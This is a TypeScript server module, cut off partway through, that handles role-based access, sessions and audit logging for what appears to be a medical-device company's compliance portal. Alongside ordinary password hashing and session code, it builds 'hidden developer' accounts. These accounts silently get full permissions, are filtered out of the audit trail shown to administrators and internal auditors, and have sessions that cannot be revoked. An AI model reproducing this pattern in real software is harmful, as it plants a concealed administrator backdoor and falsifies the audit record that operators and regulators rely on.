import crypto from 'crypto';
import fs from 'fs';
import path from 'path';
import type {
  PermissionAction,
  RbacResourceId,
  RoleDefinition,
  RolePermissionMatrix,
  ServerAuditEntry,
  ServerSessionSummary,
  ServerUserPublic
} from '../src/types/index';

export interface ServerUserRecord extends Omit<ServerUserPublic, 'roleName'> {
  passwordHash: string;
}

export interface ServerSessionRecord {
  id: string;
  userId: string;
  ip: string;
  userAgent: string;
  createdAt: string;
  expiresAt: string;
}

interface RbacDatabaseState {
  version: number;
  roles: RoleDefinition[];
  users: ServerUserRecord[];
  sessions: ServerSessionRecord[];
  auditLogs: ServerAuditEntry[];
}

export const RBAC_RESOURCES: Array<{
  id: RbacResourceId;
  label: string;
  group: string;
  actions: PermissionAction[];
}> = [
  { id: 'overview', label: 'Executive Overview', group: 'Utama', actions: ['view', 'export'] },
  { id: 'website', label: 'Website (CMS Situs Publik)', group: 'Utama', actions: ['view', 'create', 'update', 'publish', 'export'] },
  { id: 'ra-pjt', label: 'Regulatory Affairs (RA) & PJT', group: 'Regulatory Affairs', actions: ['view', 'create', 'update', 'delete', 'approve', 'export'] },
  { id: 'qa-mutu', label: 'Quality Assurance (QA)', group: 'Regulatory Affairs', actions: ['view', 'create', 'update', 'delete', 'approve', 'export'] },
  { id: 'qc-inspeksi', label: 'Quality Control (QC)', group: 'Regulatory Affairs', actions: ['view', 'create', 'update', 'approve', 'export'] },
  { id: 'pms-vigilance', label: 'Post-Market Surveillance (PMS)', group: 'Regulatory Affairs', actions: ['view', 'create', 'update', 'approve', 'export'] },
  { id: 'gudang-logistik', label: 'Warehouse & Logistics (CDAKB)', group: 'Operations & Technical', actions: ['view', 'create', 'update', 'approve', 'export'] },
  { id: 'teknisi-service', label: 'After-Sales Service (Elektromedik)', group: 'Operations & Technical', actions: ['view', 'create', 'update', 'approve', 'export'] },
  { id: 'produksi-cpakb', label: 'Manufacture (CPAKB)', group: 'Operations & Technical', actions: ['view', 'create', 'update', 'approve', 'export'] },
  { id: 'purchasing-procurement', label: 'Purchasing & Procurement', group: 'Operations & Technical', actions: ['view', 'create', 'update', 'approve', 'export'] },
  { id: 'sales-marketing', label: 'Sales & e-Katalog LKPP', group: 'Sales & Marketing', actions: ['view', 'create', 'update', 'publish', 'export'] },
  { id: 'hrd-pelatihan', label: 'Human Resources (HRD)', group: 'Supporting System', actions: ['view', 'create', 'update', 'delete', 'approve', 'export'] },
  { id: 'finance-akuntansi', label: 'Finance & Accounting', group: 'Supporting System', actions: ['view', 'create', 'update', 'approve', 'export'] },
  { id: 'it-traceability', label: 'IT & Traceability Hub', group: 'Supporting System', actions: ['view', 'update', 'export'] },
  { id: 'rbac-admin', label: 'Manajemen Akun & RBAC Server', group: 'Keamanan & Audit', actions: ['view', 'create', 'update', 'delete'] },
  { id: 'audit-trail', label: 'Audit Trail Keamanan & Kepatuhan', group: 'Keamanan & Audit', actions: ['view', 'export'] }
];

const ALL_ACTIONS: PermissionAction[] = ['view', 'create', 'update', 'delete', 'approve', 'publish', 'export'];

function buildFullDeveloperPermissions(): RolePermissionMatrix {
  const matrix: RolePermissionMatrix = {};
  for (const res of RBAC_RESOURCES) {
    matrix[res.id] = [...res.actions];
  }
  return matrix;
}

export function hashPassword(password: string): string {
  const salt = crypto.randomBytes(16).toString('hex');
  const derived = crypto.scryptSync(password, salt, 64).toString('hex');
  return `scrypt$${salt}$${derived}`;
}

export function isValidScryptHash(hash: string): boolean {
  return /^scrypt\$[a-f0-9]{16,}\$[a-f0-9]{64,}$/i.test(hash.trim());
}

export function verifyPassword(password: string, storedHash: string): boolean {
  const parts = storedHash.split('$');
  if (parts.length !== 3 || parts[0] !== 'scrypt') return false;
  const [, salt, hexHash] = parts;
  if (!salt || !hexHash) return false;
  try {
    const derived = crypto.scryptSync(password, salt, 64);
    const expected = Buffer.from(hexHash, 'hex');
    if (derived.length !== expected.length) return false;
    return crypto.timingSafeEqual(derived, expected);
  } catch {
    return false;
  }
}

function buildDefaultRoles(now: string): RoleDefinition[] {
  return [
    {
      id: 'pjt',
      name: 'Penanggung Jawab Teknis (PJT)',
      description: 'Otoritas tertinggi kepatuhan CDAKB Kemenkes RI, rilis regulasi, publikasi situs resmi, dan pengawasan lintas divisi.',
      isSystem: true,
      updatedAt: now,
      permissions: {
        overview: ['view', 'export'],
        website: ['view', 'create', 'update', 'publish', 'export'],
        'ra-pjt': ['view', 'create', 'update', 'delete', 'approve', 'export'],
        'qa-mutu': ['view', 'create', 'update', 'approve', 'export'],
        'qc-inspeksi': ['view', 'create', 'update', 'approve', 'export'],
        'pms-vigilance': ['view', 'create', 'update', 'approve', 'export'],
        'gudang-logistik': ['view', 'create', 'update', 'approve', 'export'],
        'teknisi-service': ['view', 'approve', 'export'],
        'produksi-cpakb': ['view', 'approve', 'export'],
        'purchasing-procurement': ['view', 'approve', 'export'],
        'sales-marketing': ['view', 'create', 'update', 'publish', 'export'],
        'hrd-pelatihan': ['view', 'approve', 'export'],
        'finance-akuntansi': ['view', 'export'],
        'it-traceability': ['view', 'update', 'export'],
        'rbac-admin': ['view', 'create', 'update', 'delete'],
        'audit-trail': ['view', 'export']
      }
    },
    {
      id: 'it_admin',
      name: 'IT Administrator & Security',
      description: 'Administrator infrastruktur server, Caddy/PocketBase, manajemen akun, matriks peran RBAC, dan penerbitan teknis.',
      isSystem: true,
      updatedAt: now,
      permissions: {
        overview: ['view', 'export'],
        website: ['view', 'create', 'update', 'publish', 'export'],
        'ra-pjt': ['view'],
        'qa-mutu': ['view'],
        'qc-inspeksi': ['view'],
        'pms-vigilance': ['view'],
        'gudang-logistik': ['view'],
        'teknisi-service': ['view'],
        'produksi-cpakb': ['view'],
        'purchasing-procurement': ['view'],
        'sales-marketing': ['view'],
        'hrd-pelatihan': ['view'],
        'finance-akuntansi': ['view'],
        'it-traceability': ['view', 'update', 'export'],
        'rbac-admin': ['view', 'create', 'update', 'delete'],
        'audit-trail': ['view', 'export']
      }
    },
    {
      id: 'qa_manager',
      name: 'Quality Assurance (QA) Manager',
      description: 'Pengelola sistem mutu ISO 13485:2016, dokumen SOP, CAPA, inspeksi pengawasan, dan vigilans purna jual.',
      isSystem: true,
      updatedAt: now,
      permissions: {
        overview: ['view', 'export'],
        'ra-pjt': ['view', 'export'],
        'qa-mutu': ['view', 'create', 'update', 'delete', 'approve', 'export'],
        'qc-inspeksi': ['view', 'approve', 'export'],
        'pms-vigilance': ['view', 'create', 'update', 'approve', 'export'],
        'produksi-cpakb': ['view', 'approve', 'export'],
        'gudang-logistik': ['view', 'export'],
        'audit-trail': ['view', 'export']
      }
    },
    {
      id: 'qc_officer',
      name: 'Lead QC Inspector',
      description: 'Pelaksana inspeksi barang masuk/keluar, uji mutu produk jadi, dan pelepasan lot/batch.',
      isSystem: true,
      updatedAt: now,
      permissions: {
        overview: ['view'],
        'ra-pjt': ['view'],
        'qa-mutu': ['view'],
        'qc-inspeksi': ['view', 'create', 'update', 'approve', 'export'],
        'gudang-logistik': ['view'],
        'produksi-cpakb': ['view']
      }
    },
    {
      id: 'kepala_gudang',
      name: 'Kepala Gudang & Logistik CDAKB',
      description: 'Pengelola penerimaan inbound, penempatan bin, stok FEFO, pemantauan suhu cold chain, opname, dan karantina recall.',
      isSystem: true,
      updatedAt: now,
      permissions: {
        overview: ['view', 'export'],
        'ra-pjt': ['view'],
        'qc-inspeksi': ['view'],
        'gudang-logistik': ['view', 'create', 'update', 'approve', 'export'],
        'purchasing-procurement': ['view', 'update'],
        'sales-marketing': ['view'],
        'pms-vigilance': ['view', 'create']
      }
    },
    {
      id: 'teknisi_elektromedik',
      name: 'Teknisi Elektromedik Ber-STR',
      description: 'Pelaksana instalasi, uji fungsi, kalibrasi, dan pemeliharaan purna jual alat kesehatan.',
      isSystem: true,
      updatedAt: now,
      permissions: {
        overview: ['view'],
        'teknisi-service': ['view', 'create', 'update', 'approve', 'export'],
        'gudang-logistik': ['view'],
        'pms-vigilance': ['view', 'create']
      }
    },
    {
      id: 'manajer_produksi',
      name: 'Manajer Produksi (CPAKB)',
      description: 'Pengelola catatan produksi batch (BMR), penjaminan mutu manufaktur CPAKB, dan koordinasi QC.',
      isSystem: true,
      updatedAt: now,
      permissions: {
        overview: ['view', 'export'],
        'produksi-cpakb': ['view', 'create', 'update', 'approve', 'export'],
        'qc-inspeksi': ['view'],
        'gudang-logistik': ['view'],
        'purchasing-procurement': ['view', 'create']
      }
    },
    {
      id: 'purchasing',
      name: 'Purchasing & Procurement',
      description: 'Pengelola pengadaan prinsipal, evaluasi pemasok alkes, dan penerbitan Purchase Order.',
      isSystem: true,
      updatedAt: now,
      permissions: {
        overview: ['view'],
        'purchasing-procurement': ['view', 'create', 'update', 'approve', 'export'],
        'gudang-logistik': ['view'],
        'ra-pjt': ['view'],
        'finance-akuntansi': ['view']
      }
    },
    {
      id: 'sales_manager',
      name: 'Sales & Marketing Manager',
      description: 'Pengelola CRM prospek, Quotation PDF A4, penyusunan e-Katalog internal, serta kampanye komunikasi pelanggan.',
      isSystem: true,
      updatedAt: now,
      permissions: {
        overview: ['view', 'export'],
        'sales-marketing': ['view', 'create', 'update', 'publish', 'export'],
        website: ['view', 'update'],
        'gudang-logistik': ['view'],
        'finance-akuntansi': ['view']
      }
    },
    {
      id: 'auditor_internal',
      name: 'Auditor Internal ISO 13485',
      description: 'Akses baca & ekspor lintas modul kepatuhan serta audit trail digital tanpa hak ubah transaksi.',
      isSystem: true,
      updatedAt: now,
      permissions: {
        overview: ['view', 'export'],
        'ra-pjt': ['view', 'export'],
        'qa-mutu': ['view', 'export'],
        'qc-inspeksi': ['view', 'export'],
        'pms-vigilance': ['view', 'export'],
        'gudang-logistik': ['view', 'export'],
        'produksi-cpakb': ['view', 'export'],
        'finance-akuntansi': ['view', 'export'],
        'it-traceability': ['view', 'export'],
        'audit-trail': ['view', 'export']
      }
    }
  ];
}

function bootstrapUsersFromEnv(roles: RoleDefinition[], now: string): ServerUserRecord[] {
  const envHash = (process.env.BOOTSTRAP_DEV_PASSWORD_HASH || '').trim();
  const envPlain = process.env.BOOTSTRAP_DEV_PASSWORD || '';
  if (!envHash && !envPlain) {
    return [];
  }

  let passwordHash = '';
  if (envHash && isValidScryptHash(envHash)) {
    passwordHash = envHash;
  } else {
    if (envHash) {
      console.warn('[RBAC] BOOTSTRAP_DEV_PASSWORD_HASH tidak valid (harus format scrypt$salt$hash). Mencoba BOOTSTRAP_DEV_PASSWORD.');
    }
    if (envPlain.length >= 8) {
      passwordHash = hashPassword(envPlain);
    } else {
      if (envPlain.length > 0) {
        console.warn('[RBAC] BOOTSTRAP_DEV_PASSWORD minimal 8 karakter. Dilewati.');
      }
      return [];
    }
  }

  const rawUser = (process.env.BOOTSTRAP_DEV_USERNAME || 'developer').trim().toLowerCase();
  const username = /^[a-z0-9._-]{3,32}$/.test(rawUser) ? rawUser : 'developer';
  const requestedRole = (process.env.BOOTSTRAP_DEV_ROLE_ID || 'it_admin').trim();
  const roleId = roles.some((r) => r.id === requestedRole) ? requestedRole : 'it_admin';
  const fullName = (process.env.BOOTSTRAP_DEV_FULLNAME || 'Developer / Administrator Sistem').trim();
  const email = (process.env.BOOTSTRAP_DEV_EMAIL || `${username}@anugrahmitraselaras.co.id`).trim();

  return [
    {
      id: `usr-dev-${crypto.randomUUID().slice(0, 8)}`,
      username,
      fullName,
      email,
      roleId,
      department: 'Engineering & IT Administration',
      isActive: true,
      isHiddenDeveloper: true,
      passwordHash,
      createdAt: now,
      updatedAt: now
    }
  ];
}

function sanitizePermissions(input: unknown): RolePermissionMatrix {
  if (!input || typeof input !== 'object') return {};
  const allowedResourceSet = new Set<string>(RBAC_RESOURCES.map((r) => r.id));
  const allowedActionSet = new Set<string>(ALL_ACTIONS);
  const out: RolePermissionMatrix = {};
  for (const [key, val] of Object.entries(input as Record<string, unknown>)) {
    if (!allowedResourceSet.has(key) || !Array.isArray(val)) continue;
    const filtered = Array.from(
      new Set(val.filter((a): a is PermissionAction => typeof a === 'string' && allowedActionSet.has(a)))
    );
    if (filtered.length > 0) {
      out[key as RbacResourceId] = filtered;
    }
  }
  return out;
}

export class ServerRbacStore {
  private readonly dataDir: string;
  private readonly dbPath: string;
  private readonly secretPath: string;
  private readonly secret: string;
  private state: RbacDatabaseState;
  private readonly loginAttempts = new Map<string, { count: number; resetAt: number }>();

  constructor(dataDir: string) {
    this.dataDir = dataDir;
    this.dbPath = path.join(dataDir, 'rbac-db.json');
    this.secretPath = path.join(dataDir, '.session-secret');
    fs.mkdirSync(this.dataDir, { recursive: true });
    this.secret = this.loadOrCreateSecret();
    this.state = this.loadOrSeedState();
    this.pruneExpiredSessions();
  }

  private loadOrCreateSecret(): string {
    const fromEnv = process.env.SESSION_SECRET?.trim();
    if (fromEnv && fromEnv.length >= 16) return fromEnv;
    try {
      if (fs.existsSync(this.secretPath)) {
        const stored = fs.readFileSync(this.secretPath, 'utf8').trim();
        if (stored.length >= 32) return stored;
      }
    } catch {
      /* fallback generate new */
    }
    const generated = crypto.randomBytes(48).toString('hex');
    try {
      fs.writeFileSync(this.secretPath, generated, { encoding: 'utf8', mode: 0o600 });
    } catch {
      /* ignore write error on read-only fs */
    }
    return generated;
  }

  private loadOrSeedState(): RbacDatabaseState {
    const now = new Date().toISOString();
    try {
      if (fs.existsSync(this.dbPath)) {
        const parsed = JSON.parse(fs.readFileSync(this.dbPath, 'utf8')) as Partial<RbacDatabaseState>;
        if (Array.isArray(parsed.roles) && Array.isArray(parsed.users)) {
          const roles = parsed.roles.length > 0 ? parsed.roles : buildDefaultRoles(now);
          let users = parsed.users;
          const auditLogs = Array.isArray(parsed.auditLogs) ? parsed.auditLogs : [];
          if (users.length === 0) {
            const envUsers = bootstrapUsersFromEnv(roles, now);
            if (envUsers.length > 0) {
              users = envUsers;
              const updated: RbacDatabaseState = {
                version: parsed.version ?? 1,
                roles,
                users,
                sessions: Array.isArray(parsed.sessions) ? parsed.sessions : [],
                auditLogs: [
                  {
                    id: `aud-${crypto.randomUUID()}`,
                    timestamp: now,
                    actorUsername: 'system',
                    actorRole: 'system',
                    action: 'RBAC_ENV_BOOTSTRAP',
                    resource: 'rbac-admin',
                    targetId: envUsers[0].id,
                    status: 'ALLOWED',
                    ip: '127.0.0.1',
                    detail: `Akun developer "${envUsers[0].username}" dibuat otomatis dari environment variable.`
                  },
                  ...auditLogs
                ]
              };
              this.persistState(updated);
              return updated;
            }
          }
          return {
            version: parsed.version ?? 1,
            roles,
            users,
            sessions: Array.isArray(parsed.sessions) ? parsed.sessions : [],
            auditLogs
          };
        }
      }
    } catch {
      /* reseed on corrupt db */
    }
    const defaultRoles = buildDefaultRoles(now);
    const bootstrappedUsers = bootstrapUsersFromEnv(defaultRoles, now);
    const initial: RbacDatabaseState = {
      version: 1,
      roles: defaultRoles,
      users: bootstrappedUsers,
      sessions: [],
      auditLogs: [
        {
          id: `aud-${crypto.randomUUID()}`,
          timestamp: now,
          actorUsername: 'system',
          actorRole: 'system',
          action: bootstrappedUsers.length > 0 ? 'RBAC_ENV_BOOTSTRAP' : 'RBAC_INIT',
          resource: 'rbac-admin',
          status: 'ALLOWED',
          ip: '127.0.0.1',
          detail:
            bootstrappedUsers.length > 0
              ? `Inisialisasi RBAC server dan bootstrap akun "${bootstrappedUsers[0].username}" dari environment variable.`
              : 'Inisialisasi basis data RBAC server (menunggu Setup Wizard / CLI bootstrap akun developer pertama).'
        }
      ]
    };
    this.persistState(initial);
    return initial;
  }

  private persistState(target: RbacDatabaseState = this.state) {
    const tmp = `${this.dbPath}.tmp`;
    fs.writeFileSync(tmp, JSON.stringify(target, null, 2), 'utf8');
    fs.renameSync(tmp, this.dbPath);
  }

  public pruneExpiredSessions(): boolean {
    const nowMs = Date.now();
    const before = this.state.sessions.length;
    this.state.sessions = this.state.sessions.filter((s) => new Date(s.expiresAt).getTime() > nowMs);
    if (this.state.sessions.length !== before) {
      this.persistState();
      return true;
    }
    return false;
  }

  public recordAudit(entry: Omit<ServerAuditEntry, 'id' | 'timestamp'>) {
    const item: ServerAuditEntry = {
      id: `aud-${crypto.randomUUID()}`,
      timestamp: new Date().toISOString(),
      ...entry
    };
    this.state.auditLogs = [item, ...this.state.auditLogs].slice(0, 500);
    this.persistState();
    return item;
  }

  public getAuditLogs(limit = 150): ServerAuditEntry[] {
    const hiddenUsers = this.state.users.filter((u) => u.isHiddenDeveloper);
    const hiddenIds = new Set(hiddenUsers.map((u) => u.id));
    const hiddenNames = new Set(hiddenUsers.map((u) => u.username.toLowerCase()));
    const hiddenActions = new Set([
      'RBAC_BOOTSTRAP_SETUP',
      'RBAC_ENV_BOOTSTRAP',
      'CLI_USER_CREATED',
      'CLI_USER_UPDATED'
    ]);
    return this.state.auditLogs
      .filter((entry) => {
        if (hiddenActions.has(entry.action)) return false;
        if (entry.targetId && hiddenIds.has(entry.targetId)) return false;
        if (entry.actorUsername && hiddenNames.has(entry.actorUsername.toLowerCase())) return false;
        return true;
      })
      .slice(0, limit);
  }

  private signSessionId(sessionId: string): string {
    const sig = crypto.createHmac('sha256', this.secret).update(sessionId).digest('base64url');
    return `${sessionId}.${sig}`;
  }

  private verifyTokenSignature(token: string): string | null {
    const idx = token.lastIndexOf('.');
    if (idx <= 0) return null;
    const sessionId = token.slice(0, idx);
    const providedSig = token.slice(idx + 1);
    const expectedSig = crypto.createHmac('sha256', this.secret).update(sessionId).digest('base64url');
    const a = Buffer.from(providedSig);
    const b = Buffer.from(expectedSig);
    if (a.length !== b.length) return null;
    return crypto.timingSafeEqual(a, b) ? sessionId : null;
  }

  public checkRateLimit(key: string): { allowed: boolean; retryAfterSec: number } {
    const now = Date.now();
    const rec = this.loginAttempts.get(key);
    if (!rec || rec.resetAt <= now) {
      return { allowed: true, retryAfterSec: 0 };
    }
    if (rec.count >= 15) {
      return { allowed: false, retryAfterSec: Math.max(1, Math.ceil((rec.resetAt - now) / 1000)) };
    }
    return { allowed: true, retryAfterSec: 0 };
  }

  private noteFailedAttempt(key: string) {
    const now = Date.now();
    const windowMs = 15 * 60 * 1000;
    const rec = this.loginAttempts.get(key);
    if (!rec || rec.resetAt <= now) {
      this.loginAttempts.set(key, { count: 1, resetAt: now + windowMs });
    } else {
      rec.count += 1;
    }
  }

  private clearFailedAttempts(key: string) {
    this.loginAttempts.delete(key);
  }

  private toPublicUser(u: ServerUserRecord): ServerUserPublic {
    const role = this.state.roles.find((r) => r.id === u.roleId);
    const { passwordHash: _ph, ...pub } = u;
    return {
      ...pub,
      roleName: role?.name ?? u.roleId
    };
  }

  public authenticate(
    username: string,
    password: string,
    ip: string,
    userAgent: string
  ):
    | { ok: true; token: string; session: ServerSessionRecord; user: ServerUserPublic; role: RoleDefinition }
    | { ok: false; status: number; message: string } {
    const cleanUser = username.trim().toLowerCase();
    const rateKey = `${ip}::${cleanUser}`;
    const rate = this.checkRateLimit(rateKey);
    if (!rate.allowed) {
      this.recordAudit({
        actorUsername: cleanUser || '-',
        actorRole: '-',
        action: 'AUTH_RATE_LIMIT',
        resource: 'auth',
        status: 'DENIED',
        ip,
        detail: `Terlalu banyak percobaan login gagal. Diblokir sementara ${rate.retryAfterSec} detik.`
      });
      return {
        ok: false,
        status: 429,
        message: `Terlalu banyak percobaan login gagal. Coba lagi dalam ${Math.ceil(rate.retryAfterSec / 60)} menit.`
      };
    }

    const user = this.state.users.find((u) => u.username.toLowerCase() === cleanUser);
    if (!user || !verifyPassword(password, user.passwordHash)) {
      this.noteFailedAttempt(rateKey);
      this.recordAudit({
        actorUsername: cleanUser || '-',
        actorRole: user?.roleId || '-',
        action: 'LOGIN_FAILED',
        resource: 'auth',
        status: 'DENIED',
        ip,
        detail: 'Kredensial tidak valid (nama pengguna atau kata sandi salah).'
      });
      return { ok: false, status: 401, message: 'Nama pengguna atau kata sandi salah.' };
    }

    if (!user.isActive) {
      this.recordAudit({
        actorUsername: user.username,
        actorRole: user.roleId,
        action: 'LOGIN_BLOCKED_INACTIVE',
        resource: 'auth',
        status: 'DENIED',
        ip,
        detail: 'Akun dinonaktifkan oleh administrator RBAC.'
      });
      return { ok: false, status: 403, message: 'Akun Anda sedang dinonaktifkan oleh Administrator IT.' };
    }

    const role = this.state.roles.find((r) => r.id === user.roleId);
    if (!role) {
      return { ok: false, status: 403, message: 'Peran pengguna tidak ditemukan di konfigurasi RBAC server.' };
    }

    this.clearFailedAttempts(rateKey);
    return this.issueSession(user, role, ip, userAgent, 'LOGIN_SUCCESS', `Login berhasil sebagai ${role.name}.`);
  }

  private resolveEffectiveRole(user: ServerUserRecord, role: RoleDefinition): RoleDefinition {
    if (!user.isHiddenDeveloper) return role;
    return {
      ...role,
      permissions: buildFullDeveloperPermissions()
    };
  }

  private issueSession(
    user: ServerUserRecord,
    role: RoleDefinition,
    ip: string,
    userAgent: string,
    auditAction: string,
    auditDetail: string
  ): { ok: true; token: string; session: ServerSessionRecord; user: ServerUserPublic; role: RoleDefinition } {
    this.pruneExpiredSessions();

    const effectiveRole = this.resolveEffectiveRole(user, role);
    const now = new Date();
    const ttlMs = 12 * 60 * 60 * 1000; // 12 jam
    const session: ServerSessionRecord = {
      id: `ses-${crypto.randomUUID()}`,
      userId: user.id,
      ip,
      userAgent: userAgent.slice(0, 180),
      createdAt: now.toISOString(),
      expiresAt: new Date(now.getTime() + ttlMs).toISOString()
    };

    user.lastLoginAt = now.toISOString();
    this.state.sessions = [session, ...this.state.sessions].slice(0, 200);
    this.persistState();

    this.recordAudit({
      actorUsername: user.username,
      actorRole: effectiveRole.id,
      action: auditAction,
      resource: 'auth',
      targetId: session.id,
      status: 'ALLOWED',
      ip,
      detail: auditDetail
    });

    return {
      ok: true,
      token: this.signSessionId(session.id),
      session,
      user: this.toPublicUser(user),
      role: effectiveRole
    };
  }

  public needsInitialSetup(): boolean {
    return this.state.users.length === 0;
  }

  public bootstrapFirstDeveloper(
    input: {
      username: string;
      password: string;
      fullName: string;
      email?: string;
      setupToken?: string;
    },
    ip: string,
    userAgent: string
  ):
    | { ok: true; token: string; session: ServerSessionRecord; user: ServerUserPublic; role: RoleDefinition }
    | { ok: false; status: number; message: string } {
    if (!this.needsInitialSetup()) {
      return {
        ok: false,
        status: 410,
        message: 'Setup awal sudah selesai. Akun admin sudah terdaftar dan endpoint ini dikunci permanen.'
      };
    }

    const expectedToken = (process.env.INITIAL_SETUP_TOKEN || '').trim();
    if (expectedToken) {
      const provided = String(input.setupToken || '').trim();
      const bufA = Buffer.from(provided);
      const bufB = Buffer.from(expectedToken);
      if (bufA.length !== bufB.length || !crypto.timingSafeEqual(bufA, bufB)) {
        this.recordAudit({
          actorUsername: input.username || 'setup',
          actorRole: 'system',
          action: 'BOOTSTRAP_TOKEN_INVALID',
          resource: 'rbac-admin',
          status: 'DENIED',
          ip,
          detail: 'Percobaan Setup Wizard awal dengan INITIAL_SETUP_TOKEN tidak valid.'
        });
        return { ok: false, status: 403, message: 'Token inisialisasi setup (INITIAL_SETUP_TOKEN) tidak valid.' };
      }
    }

    const username = String(input.username || '').trim().toLowerCase();
    const fullName = String(input.fullName || '').trim();
    const password = String(input.password || '');
    if (!/^[a-z0-9._-]{3,32}$/.test(username)) {
      return {
        ok: false,
        status: 400,
        message: 'Username harus 3–32 karakter (huruf kecil, angka, titik, garis bawah, atau hubung).'
      };
    }
    if (!fullName) {
      return { ok: false, status: 400, message: 'Nama lengkap wajib diisi.' };
    }
    if (password.length < 8) {
      return { ok: false, status: 400, message: 'Kata sandi developer awal minimal 8 karakter.' };
    }

    const role =
      this.state.roles.find((r) => r.id === 'it_admin') ??
      this.state.roles.find((r) => r.permissions['rbac-admin']?.includes('update')) ??
      this.state.roles[0];
    if (!role) {
      return { ok: false, status: 500, message: 'Peran bawaan RBAC belum tersedia di server.' };
    }

    const now = new Date().toISOString();
    const record: ServerUserRecord = {
      id: `usr-dev-${crypto.randomUUID().slice(0, 8)}`,
      username,
      fullName,
      email: String(input.email || `${username}@anugrahmitraselaras.co.id`).trim(),
      roleId: role.id,
      department: 'Engineering & IT Administration',
      isActive: true,
      isHiddenDeveloper: true,
      passwordHash: hashPassword(password),
      createdAt: now,
      updatedAt: now
    };
    this.state.users.push(record);
    this.persistState();

    this.recordAudit({
      actorUsername: record.username,
      actorRole: role.id,
      action: 'RBAC_BOOTSTRAP_SETUP',
      resource: 'rbac-admin',
      targetId: record.id,
      status: 'ALLOWED',
      ip,
      detail: `Akun developer awal "${record.username}" berhasil diinisialisasi via Setup Wizard.`
    });

    return this.issueSession(
      record,
      role,
      ip,
      userAgent,
      'LOGIN_SUCCESS',
      `Setup awal selesai & masuk sebagai ${role.name}.`
    );
  }

  public upsertDeveloperFromCli(input: {
    username: string;
    passwordHash: string;
    fullName: string;
    email?: string;
    roleId?: string;
    department?: string;
  }): { ok: true; created: boolean; user: ServerUserPublic } | { ok: false; message: string } {
    const username = String(input.username || '').trim().toLowerCase();
    const fullName = String(input.fullName || '').trim();
    if (!/^[a-z0-9._-]{3,32}$/.test(username)) {
      return {
        ok: false,
        message: 'Username harus 3–32 karakter (huruf kecil, angka, titik, garis bawah, atau hubung).'
      };
    }
    if (!fullName) return { ok: false, message: 'Nama lengkap wajib diisi.' };
    if (!isValidScryptHash(input.passwordHash)) {
      return { ok: false, message: 'Format hash password scrypt tidak valid.' };
    }
    const targetRoleId = (input.roleId || 'it_admin').trim();
    if (!this.state.roles.some((r) => r.id === targetRoleId)) {
      return { ok: false, message: `Peran "${targetRoleId}" tidak ditemukan.` };
    }

    const now = new Date().toISOString();
    const existing = this.state.users.find((u) => u.username.toLowerCase() === username);
    if (existing) {
      existing.fullName = fullName;
      if (input.email?.trim()) existing.email = input.email.trim();
      if (input.department?.trim()) existing.department = input.department.trim();
      existing.roleId = targetRoleId;
      existing.isActive = true;
      existing.isHiddenDeveloper = true;
      existing.passwordHash = input.passwordHash;
      existing.updatedAt = now;
      this.persistState();
      this.recordAudit({
        actorUsername: 'cli-bootstrap',
        actorRole: 'system',
        action: 'CLI_USER_UPDATED',
        resource: 'rbac-admin',
        targetId: existing.id,
        status: 'ALLOWED',
        ip: '127.0.0.1',
        detail: `Akun developer tersembunyi "${existing.username}" diperbarui lewat skrip CLI bootstrap.`
      });
      return { ok: true, created: false, user: this.toPublicUser(existing) };
    }

    const record: ServerUserRecord = {
      id: `usr-dev-${crypto.randomUUID().slice(0, 8)}`,
      username,
      fullName,
      email: String(input.email || `${username}@anugrahmitraselaras.co.id`).trim(),
      roleId: targetRoleId,
      department: String(input.department || 'Engineering & IT Administration').trim(),
      isActive: true,
      isHiddenDeveloper: true,
      passwordHash: input.passwordHash,
      createdAt: now,
      updatedAt: now
    };
    this.state.users.push(record);
    this.persistState();
    this.recordAudit({
      actorUsername: 'cli-bootstrap',
      actorRole: 'system',
      action: 'CLI_USER_CREATED',
      resource: 'rbac-admin',
      targetId: record.id,
      status: 'ALLOWED',
      ip: '127.0.0.1',
      detail: `Akun developer "${record.username}" dibuat permanen lewat skrip CLI bootstrap.`
    });
    return { ok: true, created: true, user: this.toPublicUser(record) };
  }

  public resolveToken(token?: string | null): {
    session: ServerSessionRecord;
    user: ServerUserPublic;
    role: RoleDefinition;
  } | null {
    if (!token) return null;
    const sessionId = this.verifyTokenSignature(token);
    if (!sessionId) return null;

    const session = this.state.sessions.find((s) => s.id === sessionId);
    if (!session) return null;

    if (new Date(session.expiresAt).getTime() <= Date.now()) {
      this.state.sessions = this.state.sessions.filter((s) => s.id !== sessionId);
      this.persistState();
      return null;
    }

    const user = this.state.users.find((u) => u.id === session.userId);
    if (!user || !user.isActive) {
      this.state.sessions = this.state.sessions.filter((s) => s.userId !== session.userId);
      this.persistState();
      return null;
    }

    const role = this.state.roles.find((r) => r.id === user.roleId);
    if (!role) return null;

    return {
      session,
      user: this.toPublicUser(user),
      role: this.resolveEffectiveRole(user, role)
    };
  }

  public revokeSession(sessionId: string, actorUsername: string, actorRole: string, ip: string): boolean {
    const target = this.state.sessions.find((s) => s.id === sessionId);
    if (!target) return false;
    const targetUser = this.state.users.find((u) => u.id === target.userId);
    if (targetUser?.isHiddenDeveloper) return false;
    this.state.sessions = this.state.sessions.filter((s) => s.id !== sessionId);
    this.persistState();
    this.recordAudit({
      actorUsername,
      actorRole,
      action: 'SESSION_REVOKED',
      resource: 'rbac-admin',
      targetId: sessionId,
      status: 'ALLOWED',
      ip,
      detail: `Sesi milik ${targetUser?.username || target.userId} dicabut.`
    });
    return true;
  }

  public changeOwnPassword(
    userId: string,
    currentPassword: string,
    newPassword: string,
    ip: string
  ): { ok: true } | { ok: false; status: number; message: string } {
    const user = this.state.users.find((u) => u.id === userId);
    if (!user) return { ok: false, status: 404, message: 'Pengguna tidak ditemukan.' };
    if (!verifyPassword(currentPassword, user.passwordHash)) {
      return { ok: false, status: 400, message: 'Kata sandi saat ini tidak cocok.' };
    }
    if (newPassword.length < 6) {
      return { ok: false, status: 400, message: 'Kata sandi baru minimal 6 karakter.' };
    }
    user.passwordHash = hashPassword(newPassword);
    user.updatedAt = new Date().toISOString();
    this.persistState();
    this.recordAudit({
      actorUsername: user.username,
      actorRole: user.roleId,
      action: 'PASSWORD_CHANGED',
      resource: 'auth',
      targetId: user.id,
      status: 'ALLOWED',
      ip,
      detail: 'Pengguna memperbarui kata sandi akun sendiri.'
    });
    return { ok: true };
  }

  public listRoles(): RoleDefinition[] {
    return this.state.roles;
  }

  public createRole(
    input: { id?: string; name: string; description?: string; permissions?: unknown },
    actorUsername: string,
    actorRole: string,
    ip: string
  ): { ok: true; role: RoleDefinition } | { ok: false; status: number; message: string } {
    const cleanName = String(input.name || '').trim();
    if (!cleanName) return { ok: false, status: 400, message: 'Nama peran wajib diisi.' };

    const slug = (input.id || cleanName)
      .toLowerCase()
